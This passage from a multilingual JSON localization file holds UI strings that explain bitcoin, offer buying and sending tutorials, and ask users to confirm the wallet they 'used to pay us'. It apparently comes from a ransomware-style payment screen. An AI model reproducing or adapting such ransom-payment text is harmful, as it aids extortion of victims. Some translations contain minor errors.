        "EN": "Bitcoin is a type of digital money. It lets people send and receive money online without needing a bank. You can swap a currency (like DOLLARS, EUROS, YUAN and more) to bitcoins and save them in a 'wallet', which has its own address, and send bitcoins to other people's wallets using their addresses.",
        "AR": "البيتكوين هو نوع من المال الرقمي. يسمح للناس بإرسال واستقبال الأموال عبر الإنترنت دون الحاجة إلى بنك. يمكنك تحويل عملة (مثل الدولارات، اليوروات، اليوان والمزيد) إلى بيتكوين وتخزينها في \"محفظة\"، والتي لها عنوان خاص بها، وإرسال البيتكوين إلى محافظ الأشخاص الآخرين باستخدام عناوينهم.",
        "BN": "বিটকয়েন একটি ধরনের ডিজিটাল মুদ্রা। এটি মানুষকে ব্যাংক ছাড়াই অনলাইনে অর্থ পাঠাতে এবং গ্রহণ করতে দেয়। আপনি একটি মুদ্রা (যেমন ডলার, ইউরো, ইউয়ান এবং আরো) বিটকয়েনে বিনিময় করতে পারেন এবং সেগুলি একটি 'ওয়ালেট'-এ সংরক্ষণ করতে পারেন, যার নিজস্ব ঠিকানা রয়েছে, এবং অন্যান্য লোকেদের ওয়ালেটে বিটকয়েন পাঠাতে পারেন তাদের ঠিকানা ব্যবহার করে।",
        "CS": "Bitcoin je typ digitálních peněz. Umožňuje lidem posílat a přijímat peníze online bez potřeby banky. Můžete vyměnit měnu (jako DOLAR, EURO, YUAN a další) za bitcoiny a uložit je do 'peněženky', která má svou vlastní adresu, a posílat bitcoiny do peněženek jiných lidí pomocí jejich adres.",
        "DA": "Bitcoin er en type digital penge. Det giver folk mulighed for at sende og modtage penge online uden at skulle bruge en bank. Du kan bytte en valuta (som DOLLARS, EUROS, YUAN og mere) til bitcoins og gemme dem i en 'pung', som har sin egen adresse, og sende bitcoins til andre menneskers punge ved hjælp af deres adresser.",
        "DE": "Bitcoin ist eine Art digitales Geld. Es ermöglicht Menschen, Geld online zu senden und zu empfangen, ohne eine Bank zu benötigen. Sie können eine Währung (wie DOLLAR, EURO, YUAN und mehr) in Bitcoins umtauschen und in einer 'Brieftasche' speichern, die eine eigene Adresse hat, und Bitcoins an die Brieftaschen anderer Personen senden, indem Sie deren Adressen verwenden.",
        "EL": "Το Bitcoin είναι ένα είδος ψηφιακού χρήματος. Επιτρέπει στους ανθρώπους να στέλνουν και να λαμβάνουν χρήματα online χωρίς να χρειάζονται τράπεζα. Μπορείτε να ανταλλάξετε ένα νόμισμα (όπως ΔΟΛΑΡΙΑ, ΕΥΡΩ, ΓΟΥΑΝ και άλλα) με bitcoins και να τα αποθηκεύσετε σε ένα 'πορτοφόλι', το οποίο έχει τη δική του διεύθυνση, και να στείλετε bitcoins σε πορτοφόλια άλλων ανθρώπων χρησιμοποιώντας τις διευθύνσεις τους.",
        "ES": "El bitcoin es un tipo de dinero digital. Permite a las personas enviar y recibir dinero en línea sin necesidad de un banco. Puedes intercambiar una moneda (como DÓLARES, EUROS, YUAN y más) por bitcoins y guardarlos en una \"billetera\", que tiene su propia dirección, y enviar bitcoins a las billeteras de otras personas usando sus direcciones.",
        "ET": "Bitcoin on digitaalne raha. See võimaldab inimestel saata ja vastu võtta raha veebis ilma pangata. Saate vahetada valuutat (nt DOLLARID, EUROD, YUANID jne) bitcoinide vastu ja salvestada need 'rahakotti', millel on oma aadress, ning saata bitcoine teiste inimeste rahakottidesse, kasutades nende aadresse.",
        "FI": "Bitcoin on digitaalisen rahan muoto. Se mahdollistaa ihmisten lähettää ja vastaanottaa rahaa verkossa ilman pankkia. Voit vaihtaa valuutan (kuten DOLLARIT, EUROT, JUANIT ja muita) bitcoineiksi ja tallentaa ne 'lompakkoon', jolla on oma osoite, ja lähettää bitcoineja muiden ihmisten lompakoihin heidän osoitteitaan käyttäen.",
        "FR": "Le bitcoin est un type d'argent numérique. Il permet aux gens d'envoyer et de recevoir de l'argent en ligne sans avoir besoin d'une banque. Vous pouvez échanger une monnaie (comme des DOLLARS, des EUROS, des YUAN, et plus) contre des bitcoins et les sauvegarder dans un \"portefeuille\", qui a sa propre adresse, puis envoyer des bitcoins aux portefeuilles d'autres personnes en utilisant leurs adresses.",
        "HI": "बिटकॉइन एक प्रकार का डिजिटल पैसा है। यह लोगों को बिना बैंक की आवश्यकता के ऑनलाइन पैसे भेजने और प्राप्त करने की अनुमति देता है। आप एक मुद्रा (जैसे डॉलर्स, यूरो, युआन और अधिक) को बिटकॉइन में बदल सकते हैं और उन्हें एक 'वॉलेट' में सहेज सकते हैं, जिसका अपना पता होता है, और दूसरों के वॉलेट में बिटकॉइन भेज सकते हैं उनके पतों का उपयोग करके।",
        "HR": "Bitcoin je vrsta digitalnog novca. Omogućuje ljudima da šalju i primaju novac online bez potrebe za bankom. Možete zamijeniti valutu (poput DOLARA, EUROPA, YUANA i više) za bitcoine i spremiti ih u 'novčanik' koji ima svoju adresu, a zatim slati bitcoine u novčanike drugih ljudi koristeći njihove adrese.",
        "HU": "A Bitcoin egyfajta digitális pénz. Lehetővé teszi az emberek számára, hogy bank nélkül küldjenek és fogadjanak pénzt online. Cserélhet egy valutát (mint például DOLLÁROK, EURÓK, JÜANOK és mások) bitcointá és elmentheti őket egy 'pénztárcába', amelynek saját címe van, és bitcoint küldhet mások pénztárcájába az ő címeik használatával.",
        "ID": "Bitcoin adalah sejenis uang digital. Ini memungkinkan orang untuk mengirim dan menerima uang secara online tanpa perlu bank. Anda dapat menukar mata uang (seperti DOLAR, EURO, YUAN, dan lainnya) menjadi bitcoin dan menyimpannya dalam 'dompet', yang memiliki alamatnya sendiri, dan mengirim bitcoin ke dompet orang lain menggunakan alamat mereka.",
        "IT": "Il bitcoin è un tipo di denaro digitale. Permette alle persone di inviare e ricevere denaro online senza bisogno di una banca. Puoi scambiare una valuta (come DOLLARI, EURO, YUAN e altro) in bitcoin e conservarli in un \"portafoglio\", che ha un proprio indirizzo, e inviare bitcoin ai portafogli di altre persone utilizzando i loro indirizzi.",
        "JA": "ビットコインはデジタルマネーの一種です。銀行を必要とせずに、人々がオンラインでお金を送受信できるようにします。ドル、ユーロ、元などの通貨をビットコインに交換し、独自のアドレスを持つ「ウォレット」に保存し、他の人のアドレスを使用してビットコインを送信できます。",
        "KO": "비트코인은 디지털 화폐의 일종입니다. 은행 없이 사람们이 온라인으로 돈을 보내고 받을 수 있게 해줍니다. 당신은 화폐(예: 달러, 유로, 위안 등)를 비트코인으로 교환하고, 고유한 주소를 가진 '지갑'에 저장한 다음, 다른 사람의 주소를 사용하여 비트코인을 다른 사람의 지갑으로 보낼 수 있습니다.",
        "LT": "Bitcoin yra skaitmeninių pinigų rūšis. Tai leidžia žmonėms siųsti ir gauti pinigus internetu, nereikia banko. Galite iškeisti valiutą (pavyzdžiui, DOLERIUS, EURUS, JUANUS ir kt.) į bitkoinus ir saugoti juos 'piniginėje', kuri turi savo adresą, ir siųsti bitkoinus kitų žmonių piniginėms, naudodami jų adresus.",
        "LV": "Bitcoin ir digitālo naudas veids. Tas ļauj cilvēkiem sūtīt un saņemt naudu tiešsaistē bez bankas. Jūs varat apmainīt valūtu (piemēram, DOLĀRUS, EIRO, JUANUS un citus) pret bitkoiniem un uzglabāt tos 'maciņā', kam ir sava adrese, un sūtīt bitkoinus citu cilvēku maciņiem, izmantojot viņu adreses.",
        "MN": "Биткойн нь цахим мөнгөний төрөл юм. Банк шаардалгүйгээр хүмүүс онлайн мөнгө илгээж, хүлээн авах боломжийг олгодог. Та валютыг (жишээлбэл, ДОЛЛАР, ЕВРО, ЮАНЬ гэх мэт) биткойн болгон солих боломжтой бөгөөд 'цүнхэнд' хадгалах бөгөөд цүнх нь өөрийн хаягтай бөгөөд бусдын цүнхэнд биткойн илгээх боломжтой.",
        "NL": "Bitcoin is een soort digitaal geld. Het stelt mensen in staat om online geld te verzenden en te ontvangen zonder een bank nodig te hebben. Je kunt een valuta (zoals DOLLARS, EURO'S, YUAN en meer) omruilen voor bitcoins en deze opslaan in een 'wallet', die een eigen adres heeft, en bitcoins naar de wallets van andere mensen sturen met behulp van hun adressen.",
        "PL": "Bitcoin to rodzaj cyfrowych pieniędzy. Pozwala ludziom wysyłać i odbierać pieniądze online bez potrzeby korzystania z banku. Możesz wymienić walutę (taką jak DOLARY, EURO, YUANY i inne) na bitcoiny i przechowywać je w 'portfelu', który ma własny adres, a następnie wysyłać bitcoiny do portfeli innych ludzi, używając ich adresów.",
        "PT": "O bitcoin é um tipo de dinheiro digital. Permite que as pessoas enviem e recebam dinheiro online sem precisar de um banco. Você pode trocar uma moeda (como DÓLARES, EUROS, YUAN e mais) por bitcoins e salvá-los em uma 'carteira', que tem seu próprio endereço, e enviar bitcoins para as carteiras de outras pessoas usando seus endereços.",
        "RO": "Bitcoin este un tip de bani digitali. Permite oamenilor să trimită și să primească bani online fără a avea nevoie de o bancă. Puteți schimba o monedă (cum ar fi DOLARI, EURO, YUAN și altele) în bitcoin și să le salvați într-un 'portofel', care are propria adresă, și să trimiteți bitcoin către portofelele altor oameni folosind adresele lor.",
        "RU": "Биткойн — это тип цифровых денег. Он позволяет людям отправлять и получать деньги онлайн, не обращаясь в банк. Вы можете обменивать валюту (например, ДОЛЛАРЫ, ЕВРО, ЮАНИ и другие) на биткойны и хранить их в «кошельке», который имеет свой собственный адрес, и отправлять биткойны в кошельки других людей, используя их адреса.",
        "SV": "Bitcoin är en typ av digitala pengar. Det låter människor skicka och ta emot pengar online utan att behöva en bank. Du kan byta en valuta (som DOLLAR, EURO, YUAN och mer) mot bitcoins och spara dem i en 'plånbok' som har sin egen adress och skicka bitcoins till andra människors plånböcker med deras adresser.",
        "SW": "Bitcoin ni aina ya pesa za kidijitali. Inawawezesha watu kutuma na kupokea pesa mtandaoni bila benki. Unaweza kubadilisha sarafu (kama DOLARI, EURO, YUAN na zaidi) kuwa bitcoin na kuziweka kwenye 'pesa', ambayo ina anwani yake mwenyewe, na kutuma bitcoin kwa pochi za watu wengine kwa kutumia anwani zao.",
        "TH": "บิตคอยน์เป็นประเภทของเงินดิจิตอล มันทำให้ผู้คนสามารถส่งและรับเงินออนไลน์โดยไม่ต้องใช้ธนาคาร คุณสามารถแลกเปลี่ยนสกุลเงิน (เช่น ดอลลาร์, ยูโร, หยวน และอื่นๆ) เป็นบิตคอยน์และเก็บไว้ใน 'กระเป๋าเงิน' ซึ่งมีที่อยู่เฉพาะของตัวเอง และส่งบิตคอยน์ไปยังที่อยู่ของกระเป๋าเงินของคนอื่นได้",
        "TR": "Bitcoin, dijital para türüdür. İnsanların bir bankaya ihtiyaç duymadan çevrimiçi para göndermelerine ve almalarına olanak tanır. Bir para birimini (DOLAR, EURO, YUAN gibi) bitcoine dönüştürebilir ve kendi adresine sahip bir 'cüzdan' içinde saklayabilirsiniz ve diğer kişilerin cüzdanlarına adreslerini kullanarak bitcoin gönderebilirsiniz.",
        "UK": "Біткойн — це тип цифрових грошей. Він дозволяє людям надсилати та отримувати гроші онлайн без потреби в банку. Ви можете обміняти валюту (таку як ДОЛАРИ, ЄВРО, ЮАНІ та інші) на біткойни та зберігати їх у «гаманці», який має свою адресу, і надсилати біткойни до гаманців інших людей, використовуючи їх адреси.",
        "ZH": "比特币是一种数字货币。它允许人们在线发送和接收资金，而无需银行。您可以将货币（如美元、欧元、人民币等）兑换成比特币，并将其保存在一个具有自己地址的“钱包”中，并使用其他人的地址将比特币发送到他们的钱包。"
    },
    "buybitcointitle": {
        "EN": "How to buy bitcoin?",
        "AR": "كيف تشتري البيتكوين؟",
        "BN": "বিটকয়েন কিভাবে কিনবেন?",
        "CS": "Jak koupit bitcoin?",
        "DA": "Hvordan køber man bitcoin?",
        "DE": "Wie kauft man Bitcoin?",
        "EL": "Πώς να αγοράσετε Bitcoin;",
        "ES": "¿Cómo comprar bitcoins?",
        "ET": "Kuidas osta bitcoini?",
        "FI": "Miten ostaa bitcoin?",
        "FR": "Comment acheter des bitcoins ?",
        "HI": "बिटकॉइन कैसे खरीदें?",
        "HR": "Kako kupiti bitcoin?",
        "HU": "Hogyan vásároljunk bitcoint?",
        "ID": "Bagaimana cara membeli bitcoin?",
        "IT": "Come comprare bitcoin?",
        "JA": "ビットコインをどのように購入しますか？",
        "KO": "비트코인을 어떻게 구매합니까?",
        "LT": "Kaip pirkti bitkoinus?",
        "LV": "Kā iegādāties bitkoinus?",
        "MN": "Биткойныг хэрхэн худалдаж авах вэ?",
        "NL": "Hoe bitcoin te kopen?",
        "PL": "Jak kupić bitcoiny?",
        "PT": "Como comprar bitcoin?",
        "RO": "Cum să cumpărați bitcoin?",
        "RU": "Как купить биткойн?",
        "SV": "Hur köper man bitcoin?",
        "SW": "Je, unununua bitcoin?",
        "TH": "จะซื้อบิตคอยน์ได้อย่างไร?",
        "TR": "Bitcoin nasıl alınır?",
        "UK": "Як купити біткойн?",
        "ZH": "如何购买比特币？"
    },
    "buybitcoin": {
        "EN": "You want to learn about how you can BUY bitcoin? Click [Yes] to open a tutorial page.",
        "AR": "هل تريد أن تتعلم كيف يمكنك شراء البيتكوين؟ انقر [نعم] لفتح صفحة الدروس.",
        "BN": "আপনি জানতে চান কিভাবে আপনি বিটকয়েন কিনতে পারেন? একটি টিউটোরিয়াল পৃষ্ঠা খুলতে [হ্যাঁ] ক্লিক করুন।",
        "CS": "Chcete se dozvědět, jak můžete KUPUJI bitcoin? Klikněte na [Ano], abyste otevřeli stránku s tutoriálem.",
        "DA": "Vil du lære, hvordan du kan KØBE bitcoin? Klik på [Ja] for at åbne en tutorialsida.",
        "DE": "Möchten Sie lernen, wie Sie Bitcoin KAUFEN können? Klicken Sie auf [Ja], um eine Tutorial-Seite zu öffnen.",
        "EL": "Θέλετε να μάθετε πώς μπορείτε να ΑΓΟΡΑΣΕΤΕ bitcoin; Κάντε κλικ στο [Ναι] για να ανοίξετε μια σελίδα οδηγού.",
        "ES": "¿Quieres aprender cómo puedes COMPRAR bitcoins? Haz clic en [Sí] para abrir una página de tutorial.",
        "ET": "Kas soovite õppida, kuidas osta bitcoini? Klõpsake [Jah], et avada õpetuse leht.",
        "FI": "Haluatko oppia, kuinka voit OSTAA bitcoinia? Napsauta [Kyllä] avataksesi opetusohjesivun.",
        "FR": "Vous voulez apprendre comment ACHETER des bitcoins ? Appuyez sur [Oui] pour ouvrir une page de tutoriel.",
        "HI": "क्या आप जानना चाहते हैं कि आप बिटकॉइन कैसे खरीद सकते हैं? एक ट्यूटोरियल पृष्ठ खोलने के लिए [हाँ] पर क्लिक करें।",
        "HR": "Želite li saznati kako možete KUPITI bitcoin? Kliknite [Da] za otvaranje stranice s uputama.",
        "HU": "Szeretné megtudni, hogyan vásárolhat bitcoint? Kattintson a [Igen] gombra, hogy megnyissa a bemutató oldalt.",
        "ID": "Apakah Anda ingin belajar bagaimana Anda dapat MEMBELI bitcoin? Klik [Ya] untuk membuka halaman tutorial.",
        "IT": "Vuoi sapere come PUOI COMPRARE bitcoin? Clicca su [Sì] per aprire una pagina di tutorial.",
        "JA": "ビットコインを購入する方法を学びたいですか？チュートリアルページを開くには[はい]をクリックしてください。",
        "KO": "비트코인을 어떻게 구매할 수 있는지 배우고 싶습니까? 튜토리얼 페이지를 열려면 [예]를 클릭하십시오.",
        "LT": "Ar norite sužinoti, kaip galite PIRKTI bitcoin? Spustelėkite [Taip], kad atidarytumėte pamokų puslapį.",
        "LV": "Vai vēlaties uzzināt, kā jūs varat PIRKT bitcoin? Noklikšķiniet uz [Jā], lai atvērtu apmācību lapu.",
        "MN": "Та биткойн хэрхэн худалдаж авах талаар сурах хүсэлтэй байна уу? Сургалтын хуудсыг нээхийн тулд [Тийм] дээр дарна уу.",
        "NL": "Wil je leren hoe je bitcoin kunt KOPEN? Klik op [Ja] om een tutorialpagina te openen.",
        "PL": "Chcesz dowiedzieć się, jak KUPIĆ bitcoiny? Kliknij [Tak], aby otworzyć stronę z samouczkiem.",
        "PT": "Você quer aprender como COMPRAR bitcoin? Clique em [Sim] para abrir uma página de tutorial.",
        "RO": "Vrei să afli cum poți CUMPĂRA bitcoin? Fă clic pe [Da] pentru a deschide o pagină de tutorial.",
        "RU": "Вы хотите узнать, как купить биткойн? Нажмите [Да], чтобы открыть страницу с руководством.",
        "SV": "Vill du lära dig hur du kan KÖPA bitcoin? Klicka på [Ja] för att öppna en tutorialsida.",
        "SW": "Unataka kujifunza jinsi ya KUNUNUA bitcoin? Bonyeza [Ndio] kufungua ukurasa wa mafunzo.",
        "TH": "คุณต้องการเรียนรู้เกี่ยวกับวิธีการซื้อบิตคอยน์หรือไม่? คลิก [ใช่] เพื่อเปิดหน้าคู่มือการสอน.",
        "TR": "Bitcoin nasıl ALINIR öğrenmek ister misiniz? Bir eğitim sayfası açmak için [Evet]e tıklayın.",
        "UK": "Ви хочете дізнатися, як купити біткойн? Натисніть [Так], щоб відкрити сторінку з керівництвом.",
        "ZH": "您想了解如何购买比特币吗？点击[是]以打开教程页面。"
    },
    "sendbitcointitle": {
        "EN": "How to send bitcoin?",
        "AR": "كيف ترسل البيتكوين؟",
        "BN": "বিটকয়েন কিভাবে পাঠাবেন?",
        "CS": "Jak poslat bitcoin?",
        "DA": "Hvordan sender man bitcoin?",
        "DE": "Wie sendet man Bitcoin?",
        "EL": "Πώς να στείλετε Bitcoin;",
        "ES": "¿Cómo enviar bitcoins?",
        "ET": "Kuidas saata bitcoini?",
        "FI": "Miten lähettää bitcoin?",
        "FR": "Comment envoyer des bitcoins ?",
        "HI": "बिटकॉइन कैसे भेजें?",
        "HR": "Kako poslati bitcoin?",
        "HU": "Hogyan küldjünk bitcoint?",
        "ID": "Bagaimana cara mengirim bitcoin?",
        "IT": "Come inviare bitcoin?",
        "JA": "ビットコインを送信するには？",
        "KO": "비트코인을 어떻게 보내나요?",
        "LT": "Kaip siųsti bitkoinus?",
        "LV": "Kā nosūtīt bitkoinus?",
        "MN": "Биткойныг хэрхэн илгээх вэ?",
        "NL": "Hoe bitcoin te verzenden?",
        "PL": "Jak wysłać bitcoiny?",
        "PT": "Como enviar bitcoin?",
        "RO": "Cum să trimiteți bitcoin?",
        "RU": "Как отправить биткойн?",
        "SV": "Hur skickar man bitcoin?",
        "SW": "Je, unatumia bitcoin?",
        "TH": "จะส่งบิตคอยน์ได้อย่างไร?",
        "TR": "Bitcoin nasıl gönderilir?",
        "UK": "Як надіслати біткойн?",
        "ZH": "如何发送比特币？"
    },
    "sendbitcoin": {
        "EN": "You want to learn about how you can SEND bitcoin? Click [Yes] to open a tutorial page.",
        "AR": "هل تريد أن تتعلم كيف يمكنك إرسال البيتكوين؟ انقر [نعم] لفتح صفحة الدروس.",
        "BN": "আপনি জানতে চান কিভাবে আপনি বিটকয়েন পাঠাতে পারেন? একটি টিউটোরিয়াল পৃষ্ঠা খুলতে [হ্যাঁ] ক্লিক করুন।",
        "CS": "Chcete se dozvědět, jak můžete POSLAT bitcoin? Klikněte na [Ano], abyste otevřeli stránku s tutoriálem.",
        "DA": "Vil du lære, hvordan du kan SENDE bitcoin? Klik på [Ja] for at åbne en tutorialsida.",
        "DE": "Möchten Sie lernen, wie Sie Bitcoin SENDEN können? Klicken Sie auf [Ja], um eine Tutorial-Seite zu öffnen.",
        "EL": "Θέλετε να μάθετε πώς μπορείτε να ΣΤΕΙΛΕΤΕ bitcoin; Κάντε κλικ στο [Ναι] για να ανοίξετε μια σελίδα οδηγού.",
        "ES": "¿Quieres aprender cómo puedes ENVIAR bitcoins? Haz clic en [Sí] para abrir una página de tutorial.",
        "ET": "Kas soovite õppida, kuidas saata bitcoini? Klõpsake [Jah], et avada õpetuse leht.",
        "FI": "Haluatko oppia, kuinka voit LÄHETTÄÄ bitcoinia? Napsauta [Kyllä] avataksesi opetusohjesivun.",
        "FR": "Vous voulez apprendre comment ENVOYER des bitcoins ? Appuyez sur [Oui] pour ouvrir une page de tutoriel.",
        "HI": "क्या आप जानना चाहते हैं कि आप बिटकॉइन कैसे भेज सकते हैं? एक ट्यूटोरियल पृष्ठ खोलने के लिए [हाँ] पर क्लिक करें।",
        "HR": "Želite li saznati kako možete POSLATI bitcoin? Kliknite [Da] za otvaranje stranice s uputama.",
        "HU": "Szeretné megtudni, hogyan küldhet bitcoint? Kattintson a [Igen] gombra, hogy megnyissa a bemutató oldalt.",
        "ID": "Apakah Anda ingin belajar bagaimana Anda dapat MENGIRIM bitcoin? Klik [Ya] untuk membuka halaman tutorial.",
        "IT": "Vuoi sapere come PUOI INVIARE bitcoin? Clicca su [Sì] per aprire una pagina di tutorial.",
        "JA": "ビットコインを送信する方法を学びたいですか？チュートリアルページを開くには[はい]をクリックしてください。",
        "KO": "비트코인을 어떻게 보내는지 배우고 싶습니까? 튜토리얼 페이지를 열려면 [예]를 클릭하십시오.",
        "LT": "Ar norite sužinoti, kaip galite SIŲSTI bitcoin? Spustelėkite [Taip], kad atidarytumėte pamokų puslapį.",
        "LV": "Vai vēlaties uzzināt, kā jūs varat NOSŪTĪT bitcoin? Noklikšķiniet uz [Jā], lai atvērtu apmācību lapu.",
        "MN": "Та биткойн хэрхэн илгээх талаар сурах хүсэлтэй байна уу? Сургалтын хуудсыг нээхийн тулд [Тийм] дээр дарна уу.",
        "NL": "Wil je leren hoe je bitcoin kunt VERZENDEN? Klik op [Ja] om een tutorialpagina te openen.",
        "PL": "Chcesz dowiedzieć się, jak WYSŁAĆ bitcoiny? Kliknij [Tak], aby otworzyć stronę z samouczkiem.",
        "PT": "Você quer aprender como ENVIAR bitcoin? Clique em [Sim] para abrir uma página de tutorial.",
        "RO": "Vrei să afli cum poți TRIMITE bitcoin? Fă clic pe [Da] pentru a deschide o pagină de tutorial.",
        "RU": "Вы хотите узнать, как отправить биткойн? Нажмите [Да], чтобы открыть страницу с руководством.",
        "SV": "Vill du lära dig hur du kan SKICKA bitcoin? Klicka på [Ja] för att öppna en tutorialsida.",
        "SW": "Unataka kujifunza jinsi ya KUTUMA bitcoin? Bonyeza [Ndio] kufungua ukurasa wa mafunzo.",
        "TH": "คุณต้องการเรียนรู้เกี่ยวกับวิธีการส่งบิตคอยน์หรือไม่? คลิก [ใช่] เพื่อเปิดหน้าคู่มือการสอน.",
        "TR": "Bitcoin nasıl GÖNDERİLİR öğrenmek ister misiniz? Bir eğitim sayfası açmak için [Evet]e tıklayın.",
        "UK": "Ви хочете дізнатися, як надіслати біткойн? Натисніть [Так], щоб відкрити сторінку з керівництвом.",
        "ZH": "您想了解如何发送比特币吗？点击[是]以打开教程页面。"
    },
    "checkpaymenttitle": {
        "EN": "Check Payment",
        "AR": "التحقق من الدفع",
        "BN": "পেমেন্ট চেক করুন",
        "CS": "Zkontrolovat platbu",
        "DA": "Tjek betaling",
        "DE": "Zahlung überprüfen",
        "EL": "Έλεγχος πληρωμής",
        "ES": "Verificar pago",
        "ET": "Kontrolli makse",
        "FI": "Tarkista maksaminen",
        "FR": "Vérifier le paiement",
        "HI": "भुगतान की जांच करें",
        "HR": "Provjerite uplatu",
        "HU": "Ellenőrizze a kifizetést",
        "ID": "Periksa Pembayaran",
        "IT": "Controlla il pagamento",
        "JA": "支払いを確認",
        "KO": "결제를 확인하세요",
        "LT": "Patikrinkite mokėjimą",
        "LV": "Pārbaudiet maksājumu",
        "MN": "Төлбөрийг шалгах",
        "NL": "Controleer betaling",
        "PL": "Sprawdź płatność",
        "PT": "Verificar pagamento",
        "RO": "Verifică plata",
        "RU": "Проверить оплату",
        "SV": "Kontrollera betalning",
        "SW": "Kagua malipo",
        "TH": "ตรวจสอบการชำระเงิน",
        "TR": "Ödemeyi kontrol et",
        "UK": "Перевірити платіж",
        "ZH": "检查付款"
    },
    "askaddress": {
        "EN": "Please enter the address of YOUR bitcoin wallet you used to pay us.",
        "AR": "يرجى إدخال عنوان محفظة البيتكوين الخاصة بك التي استخدمتها للدفع لنا.",
        "BN": "অনুগ্রহ করে আপনার ব্যবহৃত বিটকয়েন ওয়ালেটের ঠিকানা প্রবেশ করুন আমাদের অর্থ প্রদানের জন্য।",
        "CS": "Prosím, zadejte adresu VAŠEHO bitcoin peněženky, kterou jste použili k platbě.",
        "DA": "Indtast venligst adressen på DIN bitcoin-wallet, som du brugte til at betale os.",
        "DE": "Bitte geben Sie die Adresse Ihres Bitcoin-Wallets ein, das Sie für die Zahlung an uns verwendet haben.",
        "EL": "Παρακαλώ εισάγετε τη διεύθυνση του Bitcoin πορτοφολιού σας που χρησιμοποιήσατε για να μας πληρώσετε.",
        "ES": "Por favor, introduzca la dirección de su billetera de bitcoin que utilizó para pagarnos.",
        "ET": "Palun sisestage teie bitcoin rahakoti aadress, mida kasutasite meie eest maksmiseks.",
        "FI": "Ole hyvä ja syötä BITCOIN-lompakkosi osoite, jota käytit meille maksamiseen.",
        "FR": "Merci d'entrer l'adresse de votre portefeuille Bitcoin que vous avez utilisé pour nous payer.",
        "HI": "कृपया उस बिटकॉइन वॉलेट का पता दर्ज करें जिसका आपने हमें भुगतान करने के लिए उपयोग किया।",
        "HR": "Molimo vas, unesite adresu VAŠE bitcoin novčanika koju ste koristili za plaćanje.",
        "HU": "Kérjük, adja meg a BITCOIN tárca címét, amelyet használt a kifizetésünkhöz.",
        "ID": "Silakan masukkan alamat dompet bitcoin ANDA yang Anda gunakan untuk membayar kami.",
        "IT": "Si prega di inserire l'indirizzo del VOSTRO portafoglio bitcoin che hai usato per pagarci.",
        "JA": "私たちに支払うために使用したあなたのビットコインウォレットのアドレスを入力してください。",
        "KO": "저희에게 결제하기 위해 사용한 비트코인 지갑의 주소를 입력해 주세요.",
        "LT": "Prašome įvesti jūsų bitcoin piniginės adresą, kurį naudojote mums apmokėti.",
        "LV": "Lūdzu, ievadiet savas bitcoin maku adresi, kuru izmantojāt, lai mums samaksātu.",
        "MN": "Та бидэнд төлбөр төлөхөд ашигласан биткойн хэтэвчийн хаягийг оруулна уу.",
        "NL": "Voer alstublieft het adres van uw bitcoin-portemonnee in dat u heeft gebruikt om ons te betalen.",
        "PL": "Proszę wprowadzić adres swojego portfela bitcoin, którego użyłeś do zapłaty.",
        "PT": "Por favor, insira o endereço da SUA carteira de bitcoin que você usou para nos pagar.",
        "RO": "Vă rugăm să introduceți adresa portofelului dumneavoastră bitcoin pe care l-ați folosit pentru a ne plăti.",
        "RU": "Пожалуйста, введите адрес вашего биткойн-кошелька, который вы использовали для оплаты.",
        "SV": "Vänligen ange adressen till DIN bitcoin-plånbok som du använde för att betala oss.",
        "SW": "Tafadhali ingiza anwani ya pochi yako ya bitcoin uliyotumia kutulipa.",
        "TH": "กรุณาใส่ที่อยู่กระเป๋าเงินบิตคอยน์ที่คุณใช้เพื่อชำระเงินให้เรา。",
        "TR": "Lütfen bize ödeme yapmak için kullandığınız Bitcoin cüzdanının adresini girin.",
        "UK": "Будь ласка, введіть адресу вашого біткойн-кошелька, який ви використовували для оплати.",
        "ZH": "请输入您用于付款的比特币钱包地址。"
    },
    "confirmaddress": {
        "EN": "You wrote '%s'. Please make sure that this address is correct and you paid the correct amount of bitcoin with it, then confirm.",
        "AR": "لقد كتبت '%s'. يرجى التأكد من أن هذا العنوان صحيح وأنك دفعت المبلغ الصحيح من البيتكوين باستخدامه، ثم قم بالتأكيد.",
        "BN": "আপনি '%s' লিখেছেন। দয়া করে নিশ্চিত করুন যে এই ঠিকানাটি সঠিক এবং আপনি এর মাধ্যমে সঠিক পরিমাণ বিটকয়েন পরিশোধ করেছেন, তারপর নিশ্চিত করুন।",
        "CS": "Napsali jste '%s'. Ujistěte se, že je tato adresa správná a že jste s ní zaplatili správnou částku bitcoinu, a poté potvrďte.",
        "DA": "Du skrev '%s'. Vær sikker på, at denne adresse er korrekt, og at du har betalt det korrekte beløb i bitcoin med den, og bekræft derefter.",
        "DE": "Sie haben '%s' geschrieben. Bitte stellen Sie sicher, dass diese Adresse korrekt ist und dass Sie mit ihr den richtigen Betrag an Bitcoin bezahlt haben, und bestätigen Sie dann.",
        "EL": "Γράψατε '%s'. Παρακαλείστε να βεβαιωθείτε ότι αυτή η διεύθυνση είναι σωστή και ότι πληρώσατε το σωστό ποσό bitcoin με αυτήν, στη συνέχεια επιβεβαιώστε.",
        "ES": "Escribiste '%s'. Por favor, asegúrate de que esta dirección sea correcta y que pagaste la cantidad correcta de bitcoin con ella, luego confirma.",
        "ET": "Te kirjutasid '%s'. Palun veenduge, et see aadress on õige ja et maksisite selle kaudu õige summa bitcoini, seejärel kinnitage.",
        "FI": "Kirjoitit '%s'. Varmista, että tämä osoite on oikein ja olet maksanut sillä oikean määrän bitcoinia, ja vahvista sitten.",
        "FR": "Vous avez entré \"%s\". Merci de vous assurer que cette adresse est correcte et que vous avez payé la bonne quantité de bitcoin avec, puis confirmez.",
        "HI": "आपने '%s' लिखा। कृपया सुनिश्चित करें कि यह पता सही है और आपने इसके साथ सही मात्रा में बिटकॉइन का भुगतान किया है, फिर पुष्टि करें।",
        "HR": "Napisali ste '%s'. Molimo vas, provjerite je li ova adresa točna i jeste li s njom platili točan iznos bitcoina, a zatim potvrdite.",
        "HU": "Írta: '%s'. Kérjük, győződjön meg arról, hogy ez a cím helyes, és hogy a megfelelő bitcoin összeget fizette be vele, majd erősítse meg.",
        "ID": "Anda menulis '%s'. Harap pastikan bahwa alamat ini benar dan Anda membayar jumlah bitcoin yang benar dengan itu, lalu konfirmasi.",
        "IT": "Hai scritto '%s'. Assicurati che questo indirizzo sia corretto e che tu abbia pagato l'importo corretto di bitcoin con esso, quindi conferma.",
        "JA": "あなたは '%s' と書きました。このアドレスが正しいことを確認し、それを使って正しい金額のビットコインを支払ったら、確認してください。",
        "KO": "당신은 '%s'를 썼습니다. 이 주소가 정확하고 이 주소로 올바른 비트코인 금액을 지불했는지 확인한 후 확인하세요.",
        "LT": "Jūs parašėte '%s'. Prašome įsitikinti, kad ši adresas yra teisingas ir kad sumokėjote teisingą bitcoin sumą, tada patvirtinkite.",
